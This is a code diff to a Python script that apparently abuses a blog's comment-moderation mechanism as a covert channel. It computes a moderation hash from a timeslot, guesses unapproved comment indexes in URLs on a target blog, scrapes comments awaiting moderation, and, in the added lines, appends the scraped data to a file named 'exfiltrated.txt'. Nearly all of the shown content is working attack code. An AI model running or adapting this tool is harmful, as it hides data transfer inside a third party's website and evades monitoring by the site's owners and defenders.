@@ -109,44 +109,37 @@ for i in range(1, 4):
 
 if prev_unapproved_index == 0:
     prev_unapproved_index = get_current_unapproved_index()
-    print("## " + str(prev_unapproved_index))
 
 delay_to_timeslot(time_slot)
 unapproved_index = get_current_unapproved_index()
 
-print("## " + str(unapproved_index))
-
 for client in clients:
     timeslot_date = get_previous_valid_timeslot_date(datetime.datetime.utcnow(), client.time_slot)
-    print("## timeslot_date A: " + str(timeslot_date))
     timeslot_date = str(timeslot_date).split(".")[0]
-    print("## timeslot_date B: " + str(timeslot_date))
 
     computed_hash = compute_moderation_hash(timeslot_date)
     print("[INFO] Computed hash: " + computed_hash)
 
     for index_offset in range(1, len(clients) + 1):
-        print("\n\n## index_offset: " + str(index_offset))
         current_unapproved_index = prev_unapproved_index + index_offset
-        print("## prev_unapproved_index: " + str(prev_unapproved_index) + ", current_unapproved_index: " + str(current_unapproved_index))
         url = target_blog + sync_channel + "?unapproved=" + str(current_unapproved_index) + "&moderation-hash=" + computed_hash + "&url=" + str(current_unapproved_index)
         print("[INFO] Checking URL: " + url);
 
-        # TEST for quickly checking if parsing is correct
-        # url = "http://127.0.0.3/2021/08/06/hello-world/#comment-90"
-        # END_TEST
-
         response_html = fetch_comments_page(url)
-        # print("## response_html: " + response_html)
         soup = BeautifulSoup(response_html, "html.parser")
 
         if soup.find("p", class_="comment-awaiting-moderation"):
             elems = soup.find_all("div", class_="comment-content")
-            print("## elems: " + str(elems))
             elem = elems[-1]
-            print("\n\n>> [INFO] Extracted data: " + str(elem.string).strip() + "\n\n")
-            break
+            if elem and elem.string:
+                to_write = str(datetime.datetime.utcnow()) + ": "
+                to_write += "Extracted data with timeslot of " + client.time_slot + ": " + str(elem.string).strip() + "\n"
+                print("[INFO] " + to_write);
+                f = open("exfiltrated.txt", "a")
+                f.write(to_write)
+                f.close()
+                break
         else:
-            print("[INFO] No comment for moderation. Skipping...")
+            print("[INFO] No comment for moderation for " + client.time_slot + " using index " + str(current_unapproved_index) + ". Skipping...")
 
 prev_unapproved_index = unapproved_index    
